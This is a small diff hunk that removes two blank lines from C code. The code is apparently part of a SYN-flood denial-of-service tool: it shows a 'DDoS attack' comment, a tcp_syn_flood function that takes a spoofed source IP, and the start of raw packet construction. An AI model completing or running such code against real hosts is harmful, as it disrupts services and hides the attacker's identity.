@@ -26,8 +26,6 @@ struct tcp_syn {
  *  DDoS attack..
 */
 void tcp_syn_flood(char *dest_ip, int dest_port, char *spoof_ip, struct sockaddr_in *d_addr) {
-
-    
     char packet[4097], data[PACKT_SIZE];
     memset(packet, 0, sizeof(packet));
     struct iphdr *ip_header = (struct iphdr*)packet;
